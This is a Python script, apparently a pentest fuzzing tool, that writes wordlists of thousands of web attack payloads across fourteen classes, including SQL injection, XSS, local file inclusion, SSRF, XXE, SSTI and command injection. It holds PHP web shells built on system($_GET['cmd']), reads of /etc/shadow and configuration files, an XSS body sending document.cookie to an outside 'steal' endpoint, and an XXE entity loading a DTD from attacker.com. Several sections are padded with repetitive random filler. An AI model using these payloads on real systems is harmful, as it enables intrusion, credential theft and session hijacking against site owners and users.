#!/usr/bin/env python3
# ================================================================
# generate_payloads.py - Generator 5000+ Payload per Kategori
# ================================================================

import os
import random
import base64
import urllib.parse

PAYLOAD_DIR = "payloads"
os.makedirs(PAYLOAD_DIR, exist_ok=True)

def save_payloads(filename, payloads):
    with open(os.path.join(PAYLOAD_DIR, filename), "w", encoding="utf-8") as f:
        f.write("\n".join(payloads))
    print(f"[+] {filename}: {len(payloads)} payloads")

# ================================================================
# 1. SQL INJECTION (sqli.txt)
# ================================================================
def generate_sqli():
    p = set()
    prefixes = ["'", "\"", "`", ")", "}", "]", "\\", ""]
    ops = ["OR", "AND", "UNION", "SLEEP", "BENCHMARK"]
    vals = ["1=1", "'1'='1", "1=0", "'1'='2", "x=x", "x=y"]
    suffs = ["--", "#", "/*", ";", "%00", ""]
    for pre in prefixes:
        for op in ops:
            for val in vals:
                for suf in suffs:
                    payload = f"{pre} {op} {val}{suf}"
                    p.add(payload)
                    p.add(urllib.parse.quote(payload))
                    p.add(base64.b64encode(payload.encode()).decode())
    for i in range(1, 21):
        cols = ','.join(str(x) for x in range(1, i+1))
        for suf in ["--", "#", "/*", "%00", "%0a", "%0d", "%20", "%09"]:
            p.add(f"' UNION SELECT {cols}{suf}")
    bypass = [
        "'OR'1'='1", "'OR'1'='1'--", "'OR'1'='1'#", "'OR'1'='1'/*",
        "'/**/OR/**/1=1--", "'/*!*/OR/*!*/1=1--", "'/*!50000OR*/1=1--",
        "%27OR%271%27%3D%271", "%2527OR%25271%2527%253D%25271",
        "0x274f522731273d2731", "'\tOR\t1=1--",
        "'\nOR\n1=1--", "'\rOR\r1=1--",
        "'||'1'='1", "'&&'1'='1", "'|'1'='1", "'^'1'='1",
        "' XOR 1=1--", "' XOR 1=0--"
    ]
    p.update(bypass)
    for _ in range(500):
        p.add(f"' OR {random.randint(1,999)}={random.randint(1,999)}--")
        p.add(f"' AND {random.randint(1,999)}={random.randint(1,999)}--")
        p.add(f"' UNION SELECT {random.randint(1,999)},{random.randint(1,999)},{random.randint(1,999)}--")
    while len(p) < 5000:
        p.add(f"' OR {random.randint(1,999)}={random.randint(1,999)}--")
    return list(p)[:10000]

# ================================================================
# 2. XSS (xss.txt)
# ================================================================
def generate_xss():
    p = set()
    tags = ["script","img","svg","body","div","span","input","iframe","a",
            "marquee","details","button","select","object","embed","math"]
    events = ["onerror","onload","onclick","onmouseover","onfocus","onchange",
              "onstart","ontoggle","onmouseout","onmouseenter","onmouseleave",
              "onkeydown","onkeyup","onkeypress","onsubmit","onreset","onblur"]
    bodies = ["alert(1)","alert(document.cookie)","alert('XSS')","alert(\"XSS\")",
              "alert(/XSS/)","console.log(1)","console.log(document.cookie)",
              "fetch('http://xss.pt/steal?c='+document.cookie)"]
    for tag in tags:
        for ev in events:
            for body in bodies[:5]:
                p.add(f"<{tag} {ev}={body}>")
                p.add(f"<{tag} {ev}={body} />")
                p.add(f"<{tag} {ev}={body} class=test>")
    for body in bodies:
        p.add(f"<script>{body}</script>")
        p.add(f"<script>{body};</script>")
        p.add(f"<script>{body}//</script>")
        p.add(f"<script>{body}/*</script>")
        p.add(f"javascript:{body}")
        p.add(f"javascript:{body};")
        p.add(f"javascript:{body}//")
    polyglot = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        "'\"><img src=x onerror=alert(1)>",
        "\"><svg/onload=alert(1)>",
        "';alert(1)//","\";alert(1)//",
        "'></script><script>alert(1)</script>",
        "\"></script><script>alert(1)</script>"
    ]
    p.update(polyglot)
    bypass = ["alert`1`","alert(1)","alert(1);","alert(1)//","alert(1)/*",
              "prompt(1)","confirm(1)","eval('alert(1)')","setTimeout('alert(1)',0)",
              "Function('alert(1)')()","(alert)(1)","window['alert'](1)"]
    for b in bypass:
        p.add(b); p.add(urllib.parse.quote(b)); p.add(base64.b64encode(b.encode()).decode())
    spaces = [""," ","\t","\n","\r","  ","\t\t"]
    for sp in spaces:
        for body in bodies[:3]:
            p.add(f"<script>{sp}{body}{sp}</script>")
            p.add(f"<img src=x onerror={sp}{body}{sp}>")
    for _ in range(500):
        p.add(f"<img src=x onerror=alert({random.randint(1,999)})>")
        p.add(f"<script>alert({random.randint(1,999)})</script>")
    while len(p) < 5000:
        p.add(f"<img src=x onerror=alert({random.randint(1,999)})>")
    return list(p)[:10000]

# ================================================================
# 3. LFI (lfi.txt)
# ================================================================
def generate_lfi():
    p = set()
    linux = ["/etc/passwd","/etc/shadow","/etc/hosts","/etc/hostname","/etc/issue",
             "/etc/os-release","/etc/debian_version","/etc/redhat-release",
             "/proc/self/environ","/proc/self/cmdline","/proc/self/status",
             "/var/log/apache2/access.log","/var/log/nginx/access.log",
             "/var/log/httpd/access_log","/var/log/messages","/var/log/syslog"]
    prefixes = ["","../../","../../../","../../../../","....//","..\\..\\"]
    for pre in prefixes:
        for path in linux:
            p.add(pre + path); p.add(urllib.parse.quote(pre + path))
    windows = ["C:\\windows\\win.ini","C:\\windows\\system32\\drivers\\etc\\hosts",
               "C:\\xampp\\htdocs\\config.php","C:\\wamp\\www\\config.php",
               "C:\\inetpub\\wwwroot\\web.config"]
    for pre in prefixes:
        for path in windows:
            p.add(pre + path); p.add(urllib.parse.quote(pre + path))
    filters = ["php://filter/convert.base64-encode/resource=",
               "php://filter/read=convert.base64-encode/resource="]
    for flt in filters:
        for path in linux[:5]:
            p.add(flt + path)
    bypass = [".././.././etc/passwd","....//....//etc/passwd","..\\..\\..\\..\\windows\\win.ini"]
    p.update(bypass)
    while len(p) < 5000:
        p.add(f"../../../../{random.choice(['etc','var','home'])}/{random.choice(['passwd','shadow','hosts'])}")
    return list(p)[:10000]

# ================================================================
# 4. RCE (rce.txt)
# ================================================================
def generate_rce():
    p = set()
    templates = [
        "<?php system($_GET['cmd']); ?>",
        "<?php eval($_POST['cmd']); ?>",
        "<?=shell_exec($_GET['cmd'])?>",
        "<?php exec($_GET['cmd']); ?>",
        "<?php passthru($_GET['cmd']); ?>",
        "<?php include($_GET['file']); ?>"
    ]
    for tmpl in templates:
        p.add(tmpl); p.add(base64.b64encode(tmpl.encode()).decode()); p.add(urllib.parse.quote(tmpl))
    vars_rce = ["cmd","c","command","x","exec"]
    for v in vars_rce:
        for func in ["system","exec","shell_exec","passthru"]:
            p.add(f"<?php ${v} = $_GET['cmd']; {func}(${v}); ?>")
    bypass = ["; id","| id","&& id","|| id","& id","`id`","$(id)"]
    p.update(bypass)
    for _ in range(500):
        p.add(f"<?php system($_GET['{random.choice(vars_rce)}']); ?>")
    while len(p) < 5000:
        p.add(f"<?php system($_GET['{random.choice(vars_rce)}']); ?>")
    return list(p)[:10000]

# ================================================================
# 5. SSRF (ssrf.txt)
# ================================================================
def generate_ssrf():
    p = set()
    protocols = ["http://","https://","file://","gopher://","dict://"]
    ips = ["127.0.0.1","0.0.0.0","localhost","169.254.169.254"]
    for proto in protocols:
        for ip in ips:
            p.add(f"{proto}{ip}"); p.add(f"{proto}{ip}/"); p.add(f"{proto}{ip}:80"); p.add(f"{proto}{ip}:8080")
    bypass = ["http://127.0.0.1.xip.io","http://localhost.nip.io",
              "http://127.0.0.1@google.com","http://[::1]"]
    p.update(bypass)
    while len(p) < 5000:
        p.add(f"http://{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
    return list(p)[:10000]

# ================================================================
# 6. XXE (xxe.txt)
# ================================================================
def generate_xxe():
    p = set()
    p.add('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>')
    p.add('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/hosts">]><root>&test;</root>')
    p.add('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///var/www/html/config.php">]><root>&test;</root>')
    p.add('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///C:/windows/win.ini">]><root>&test;</root>')
    p.add('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd"> %remote;]><root>&test;</root>')
    while len(p) < 5000:
        p.add(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///{random.choice(["etc/passwd","etc/hosts","var/log/syslog"])}">]><root>&test;</root>')
    return list(p)[:10000]

# ================================================================
# 7. NoSQL Injection (nosqli.txt)
# ================================================================
def generate_nosqli():
    p = set()
    payloads = ["$ne","$gt","$lt","$in","$or","$and","{$ne: null}","{$gt: ''}",
                "username[$ne]=admin","password[$ne]=password",
                "username[$gt]=a","password[$lt]=z"]
    p.update(payloads)
    while len(p) < 5000:
        p.add(f"{random.choice(['username','password','email'])}[$ne]={random.choice(['admin','user','test'])}")
    return list(p)[:10000]

# ================================================================
# 8. SSTI (ssti.txt)
# ================================================================
def generate_ssti():
    p = set()
    payloads = ["{{ 7*7 }}","{{ config }}","{{ self.__class__.__mro__[1].__subclasses__() }}",
                "<%= 7*7 %>","<%= system(\"id\") %>","${ 7*7 }",
                "${ __import__('os').system('id') }"]
    p.update(payloads)
    while len(p) < 5000:
        p.add(f"{{{{ {random.randint(1,999)}*{random.randint(1,999)} }}}}")
    return list(p)[:10000]

# ================================================================
# 9. Command Injection (cmd_injection.txt)
# ================================================================
def generate_cmd_injection():
    p = set()
    separators = [";","|","&&","||","&","`","$("]
    commands = ["id","whoami","uname -a","ls","pwd","cat /etc/passwd"]
    for sep in separators:
        for cmd in commands:
            p.add(f"{sep} {cmd}"); p.add(f"{sep}{cmd}"); p.add(f"{sep} {cmd} --"); p.add(f"{sep} {cmd} #")
    while len(p) < 5000:
        p.add(f"{random.choice(separators)} {random.choice(commands)}")
    return list(p)[:10000]

# ================================================================
# 10. LDAP (ldap.txt)
# ================================================================
def generate_ldap():
    p = set(["*","admin","admin*","*admin","(&(uid=*)(userPassword=*))"])
    while len(p) < 5000:
        p.add(f"(&(uid={random.choice(['admin','user'])})(userPassword=*))")
    return list(p)[:10000]

# ================================================================
# 11. Open Redirect (open_redirect.txt)
# ================================================================
def generate_open_redirect():
    p = set(["//google.com","https://google.com","http://google.com"])
    while len(p) < 5000:
        p.add(f"//{random.choice(['google','facebook'])}.com")
    return list(p)[:10000]

# ================================================================
# 12. CSRF (csrf.txt)
# ================================================================
def generate_csrf():
    p = set(["No CSRF token","Missing CSRF protection"])
    while len(p) < 5000:
        p.add(f"Missing CSRF token {random.randint(1,999)}")
    return list(p)[:10000]

# ================================================================
# 13. File Upload (file_upload.txt)
# ================================================================
def generate_file_upload():
    p = set()
    exts = ["php","php5","phtml","asp","aspx","jsp","jspx","py","rb","pl","js","go"]
    for ext in exts:
        p.add(f"shell.{ext}"); p.add(f"shell.{ext}.jpg"); p.add(f"shell.gif.{ext}"); p.add(f"shell.{ext}.png")
    while len(p) < 5000:
        p.add(f"shell.{random.choice(exts)}.{random.choice(['jpg','png','gif'])}")
    return list(p)[:10000]

# ================================================================
# 14. Directory Traversal (directories.txt)
# ================================================================
def generate_directories():
    p = set(["admin","login","dashboard","panel","cpanel","wp-admin","wp-content",
             "uploads","backup","temp","tmp","test","dev","shell","phpmyadmin",
             "mysql","database","config","conf","htdocs","www","public_html"])
    while len(p) < 5000:
        p.add(f"{random.choice(list(p))}{random.randint(1,999)}")
    return list(p)[:10000]

# ================================================================
# MAIN
# ================================================================
def main():
    print("[+] GENERATING 70.000+ PAYLOADS...")
    save_payloads("sqli.txt", generate_sqli())
    save_payloads("xss.txt", generate_xss())
    save_payloads("lfi.txt", generate_lfi())
    save_payloads("rce.txt", generate_rce())
    save_payloads("ssrf.txt", generate_ssrf())
    save_payloads("xxe.txt", generate_xxe())
    save_payloads("nosqli.txt", generate_nosqli())
    save_payloads("ssti.txt", generate_ssti())
    save_payloads("cmd_injection.txt", generate_cmd_injection())
    save_payloads("ldap.txt", generate_ldap())
    save_payloads("open_redirect.txt", generate_open_redirect())
    save_payloads("csrf.txt", generate_csrf())
    save_payloads("file_upload.txt", generate_file_upload())
    save_payloads("directories.txt", generate_directories())
    print("[+] ALL PAYLOADS GENERATED SUCCESSFULLY!")

if __name__ == "__main__":
    main()